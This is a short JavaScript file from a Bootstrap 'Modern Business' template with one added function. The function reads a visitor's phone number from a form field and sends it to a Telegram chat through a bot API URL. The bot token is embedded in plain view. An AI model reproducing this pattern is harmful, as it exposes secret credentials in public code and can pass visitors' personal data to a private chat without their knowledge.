/*!
* Start Bootstrap - Modern Business v5.0.5 (https://startbootstrap.com/template-overviews/modern-business)
* Copyright 2013-2021 Start Bootstrap
* Licensed under MIT (https://github.com/StartBootstrap/startbootstrap-modern-business/blob/master/LICENSE)
*/
// This file is intentionally blank
// Use this file to add JavaScript to your project

function sendNumber(){
    console.log("number" + document.getElementById("phone-number").value);
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://api.telegram.org/bot5025215911:AAG3IAwwqlvnK5Dsc5fbzlDbjQfTwMECKME/sendMessage?chat_id=210653177&text=" + document.getElementById("phone-number").value, false ); // false for synchronous request
    xmlHttp.send(null);
}
